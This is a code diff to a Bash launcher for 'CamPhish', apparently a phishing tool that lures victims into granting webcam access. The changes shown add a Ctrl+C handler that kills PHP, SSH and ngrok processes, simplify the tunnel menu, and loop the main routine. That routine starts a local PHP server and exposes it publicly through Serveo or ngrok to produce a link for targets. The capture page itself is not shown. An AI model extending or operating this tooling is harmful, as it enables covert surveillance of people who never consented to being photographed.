@@ -2,7 +2,15 @@
 # CamPhish v1.0 - Adrian (No Khodam Video)
 # Versi Final
 
-trap 'echo; stop' 2
+trap ctrl_c INT
+
+ctrl_c() {
+    echo -e "\n[!] Terdeteksi Ctrl+C, kembali ke menu pilihan..."
+    pkill -f php >/dev/null 2>&1
+    pkill -f ssh >/dev/null 2>&1
+    pkill -f ngrok >/dev/null 2>&1
+    select_tunnel_loop
+}
 
 stop() {
     echo "[*] Membersihkan proses..."
@@ -50,7 +58,7 @@ start_ngrok() {
     command -v ngrok >/dev/null 2>&1 || { echo "[!] Ngrok belum terinstall!"; exit 1; }
     echo "[*] Memulai Ngrok..."
     ./ngrok http 3333 >/dev/null 2>&1 &
-    
+
     echo "[*] Menunggu Ngrok URL..."
     while true; do
         link=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
@@ -72,15 +80,15 @@ select_tunnel() {
         option="${option:-1}"
 
         case "$option" in
-            1)
-                break
-                ;;
-            2)
+            1|2)
                 break
                 ;;
             0)
                 echo "⬅ Kembali ke menu utama..."
                 sleep 1
+                pkill -f php >/dev/null 2>&1
+                pkill -f ssh >/dev/null 2>&1
+                pkill -f ngrok >/dev/null 2>&1
                 cd ..
                 bash run.sh
                 exit 0
@@ -92,18 +100,21 @@ select_tunnel() {
     done
 }
 
-# Main
-banner
-dependencies
-create_ip_file
-start_php
-select_tunnel
+select_tunnel_loop() {
+    while true; do
+        banner
+        dependencies
+        create_ip_file
+        start_php
+        select_tunnel
 
-if [[ $option -eq 1 ]]; then
-    start_serveo
-elif [[ $option -eq 2 ]]; then
-    start_ngrok
-else
-    echo "[!] Pilihan tidak valid. Menggunakan Serveo default."
-    start_serveo
-fi
+        if [[ $option -eq 1 ]]; then
+            start_serveo
+        elif [[ $option -eq 2 ]]; then
+            start_ngrok
+        fi
+    done
+}
+
+# Main
+select_tunnel_loop
